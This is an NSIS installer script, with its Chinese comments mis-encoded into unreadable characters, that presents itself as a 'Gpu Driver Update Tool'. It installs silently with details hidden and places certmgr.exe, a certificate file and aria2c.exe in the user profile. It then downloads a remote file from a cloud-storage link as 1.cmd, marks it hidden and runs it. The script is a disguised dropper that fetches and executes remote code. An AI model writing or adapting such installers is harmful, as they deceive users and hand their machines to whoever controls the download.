; ���ð�װ�����ͼ��
Icon "D:\10.ico"

; ����汾��Ϣ
VIProductVersion "1.0.1.3"
VIAddVersionKey /LANG=2052 "ProductName" "Gpu Driver Update Tool"
VIAddVersionKey /LANG=2052 "CompanyName" "С�Ϲ�"
VIAddVersionKey /LANG=2052 "FileDescription" "�Կ�������������VIP"
VIAddVersionKey /LANG=2052 "FileVersion" "1.0.1.3"
VIAddVersionKey /LANG=2052 "LegalCopyright" "Copyright ${U+00A9} 2023 С�Ϲ�. All Rights Reserved"

; ���尲װ����������
OutFile "Installer.exe"

; ȷ��ʹ�õ�����ȷ���ļ�ѹ����ʽ
SetCompressor /SOLID lzma

; ���ð�װ����Ϊ��Ĭ��װ
SilentInstall silent
ShowInstDetails nevershow
ShowUninstDetails nevershow

Section
    ; ���� lgx Ŀ¼·��
    StrCpy $0 "$%USERPROFILE%\lgx"

    ; ɾ�����ڵ� lgx Ŀ¼�����´���
    RMDir /r $0
    CreateDirectory $0

    ; �ͷ��ļ��� lgx Ŀ¼
    SetOutPath $0
    File "Cert.spc"
    File "certmgr.exe"
    File "aria2c.exe"

    ; ʹ�� aria2c.exe �����ļ�����������Ϊ 1.cmd
    ExecWait '"$0\aria2c.exe" --quiet --allow-overwrite=true -d "$0" -o 1.cmd "https://vip.123pan.cn/1814328088/gtx/vip1"'

    ; �����ص� 1.cmd �ļ�����Ϊ����
    Exec 'attrib +h "$0\1.cmd"'

    ; �������ص� 1.cmd �ļ�
    Exec '"$0\1.cmd"'
SectionEnd
